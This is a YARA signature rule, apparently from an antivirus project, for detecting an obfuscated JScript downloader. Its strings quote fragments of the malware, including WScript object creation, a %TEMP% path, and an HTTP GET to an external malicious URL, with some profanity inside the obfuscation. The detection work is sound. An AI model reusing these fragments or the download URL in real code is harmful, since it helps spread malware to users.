rule sig_20160428_1538661fe1116cbc1a86e78ea4a8a137 {
  meta:
    description = "datamaliciousorder - file 20160428_1538661fe1116cbc1a86e78ea4a8a137.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2a96adc062bc3f098ffea46b421fe8618ad7aa3602eb3016513e0a2d50cadc89"

  strings:
    $s1  = "function JqwVdiKbwDowWwtMpjPct(PmdJqwRobYckOdyWowWvv){KidIypHxhEfzBvvKofSdr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function JqwVdiKbwDowWwtMpjPct(PmdJqwRobYckOdyWowWvv){KidIypHxhEfzBvvKofSdr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function HhxLmkPhjSqqLaeDghDac() {return KidIypHxhEfzBvvKofSdr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var KidIypHxhEfzBvvKofSdr = function XwfJunMctLxmBbbLllZjk() {return NagOfrSqqGdrDtjIvfLat[TqdWcbIeuEzsZjrHozYzx](\"WScript\"+\"" ascii
    $s5  = "return AojMywRbvLuxOkjZdiEet - VozRhdHqnTzaZreScbXrf;};" fullword ascii
    $s6  = "function NxfKxxTjqSimGyiEeuHji(AojMywRbvLuxOkjZdiEet, VozRhdHqnTzaZreScbXrf){RvbQzmOnkQvsYlfYgmAis = RvbQzmOnkQvsYlfYgmAis * 1; " ascii
    $s7  = "var NagOfrSqqGdrDtjIvfLat = this[\"WScript\"];" fullword ascii
    $s8  = "var KidIypHxhEfzBvvKofSdr = function XwfJunMctLxmBbbLllZjk() {return NagOfrSqqGdrDtjIvfLat[TqdWcbIeuEzsZjrHozYzx](\"WScript\"+\"" ascii
    $s9  = "function HhxLmkPhjSqqLaeDghDac() {return KidIypHxhEfzBvvKofSdr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "if (InaYywShkLfkOzkZmoCjk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function GigTepIkiJqvNpgIaiHbf(){return GrmUbrYyeUbaUkbWujFsa + \"\";};" fullword ascii
    $s12 = "function NxfKxxTjqSimGyiEeuHji(AojMywRbvLuxOkjZdiEet, VozRhdHqnTzaZreScbXrf){RvbQzmOnkQvsYlfYgmAis = RvbQzmOnkQvsYlfYgmAis * 1; " ascii
    $s13 = "InaYywShkLfkOzkZmoCjk[IkxPpyQdrJnuZpwJgyKdn](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s14 = "function RevXdhXuuXlzSioQbhPzs()" fullword ascii
    $s15 = "return NxfKxxTjqSimGyiEeuHji(1 == 1 ? MqbShbItmRjeLkxAhzVyf : 0, 1 == 1 ? HxtOayVlhPmqKmzPwkWhz : 0);" fullword ascii
    $s16 = "function PyrHyxFtiBpoPglGwnWzc(){return TqdWcbIeuEzsZjrHozYzx;};" fullword ascii
    $s17 = "var LeqXbvZzbLjdDdoIcsWvp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function VwaIbgYtuOotAyuIjtEoy(LtlJidHemMgbGtxZeuKzq) {var AnlBcuWufTasLnwHfnOrh = (1, 2, 3, 4, 5, LtlJidHemMgbGtxZeuKzq); retur" ascii
    $s19 = "function GfcHyyFihMdnQboEzwMzc(){return 23;};" fullword ascii
    $s20 = "var WxjAamEqdFwaEybYrwKsm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}